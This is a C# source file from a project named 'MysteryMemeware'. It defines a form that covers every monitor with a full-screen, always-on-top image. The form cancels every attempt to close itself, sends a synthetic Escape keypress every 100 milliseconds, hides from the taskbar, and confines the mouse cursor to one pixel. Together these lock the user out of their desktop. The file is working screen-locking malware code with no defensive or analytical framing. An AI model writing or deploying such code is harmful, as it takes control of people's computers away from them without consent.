﻿//#approved 08/07/2022 1:23am
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Drawing.Drawing2D;
namespace MysteryMemeware
{
    public sealed class ScreenCoverForm : Form
    {
        public static void CoverAllScreens(Image coverImage, InterpolationMode interpolationMode = InterpolationMode.Default)
        {
            foreach (Screen screen in Screen.AllScreens)
            {
                CoverScreen(screen, coverImage, interpolationMode);
            }
        }
        public static Thread CoverScreen(int targetScreenIndex, Image coverImage, InterpolationMode interpolationMode = InterpolationMode.Default)
        {
            if (targetScreenIndex < 0 || targetScreenIndex > Screen.AllScreens.Length)
            {
                throw new Exception("targetScreenIndex must be within the bounds of Screen.AllScreens.");
            }
            return CoverScreen(Screen.AllScreens[targetScreenIndex], coverImage, interpolationMode);
        }
        public static Thread CoverScreen(Screen targetScreen, Image coverImage, InterpolationMode interpolationMode = InterpolationMode.Default)
        {
            Thread screenCoverThread = new Thread(() =>
            {
                ScreenCoverForm screenCoverForm = new ScreenCoverForm(targetScreen, coverImage, interpolationMode);
                screenCoverForm.ShowDialog();
            });
            screenCoverThread.Start();
            return screenCoverThread;
        }
        public InterpolationMode InterpolationMode
        {
            get
            {
                return _customPictureBox.InterpolationMode;
            }
            set
            {
                _customPictureBox.InterpolationMode = value;
            }
        }
        public readonly Image CoverImage = null;
        public readonly Screen TargetScreen = null;

        private InterpolatedPictureBox _customPictureBox = null;
        private Image _coverImageClone = null;
        private System.Windows.Forms.Timer _setPropertiesTimer = null;
        private bool _resizing = false;
        public ScreenCoverForm(Screen targetScreen, Image coverImage, InterpolationMode interpolationMode = InterpolationMode.Default)
        {
            if (targetScreen is null)
            {
                throw new Exception("targetScreen cannot be null.");
            }
            TargetScreen = targetScreen;

            if (coverImage is null)
            {
                throw new Exception("coverImage cannot be null.");
            }
            CoverImage = coverImage;

            _coverImageClone = (Image)CoverImage.Clone();

            _customPictureBox = new InterpolatedPictureBox(interpolationMode);
            _customPictureBox.Image = _coverImageClone;
            _customPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;

            Controls.Add(_customPictureBox);

            FormClosing += OnFormClosing;

            _setPropertiesTimer = new System.Windows.Forms.Timer();
            _setPropertiesTimer.Interval = 100;
            _setPropertiesTimer.Tag = null;
            _setPropertiesTimer.Tick += (object sender, EventArgs e) =>
            {
                SetProperties();
            };
            _setPropertiesTimer.Enabled = true;
            _setPropertiesTimer.Start();

            SetProperties();
        }
        [DllImport("user32.dll", SetLastError = true)] 
        private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
        private static void SendEscape()
        {
            keybd_event(27, 0, 0, 0);
            keybd_event(27, 0, 2, 0);
        }
        private void SetProperties()
        {
            SendEscape();
            _customPictureBox.Location = new Point(0, 0);
            _customPictureBox.Width = Width;
            _customPictureBox.Height = Height;
            if (_resizing)
            {
                return;
            }
            BackColor = Color.Black;
            ShowInTaskbar = false;
            TopMost = true;
            AllowDrop = false;
            FormBorderStyle = FormBorderStyle.None;
            StartPosition = FormStartPosition.Manual;
            Location = TargetScreen.Bounds.Location;
            Width = TargetScreen.Bounds.Width;
            Height = TargetScreen.Bounds.Height;
            MinimizeBox = false;
            MaximizeBox = false;
            MinimumSize = new Size(TargetScreen.Bounds.Width, TargetScreen.Bounds.Height);
            Padding = new Padding(0, 0, 0, 0);
            WindowState = FormWindowState.Maximized;
            Cursor.Clip = new Rectangle(Location, new Size(1, 1));
        }
        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
        protected override void OnResizeBegin(EventArgs e)
        {
            _resizing = true;
        }
        protected override void OnResizeEnd(EventArgs e)
        {
            _resizing = false;
            SetProperties();
        }
    }
}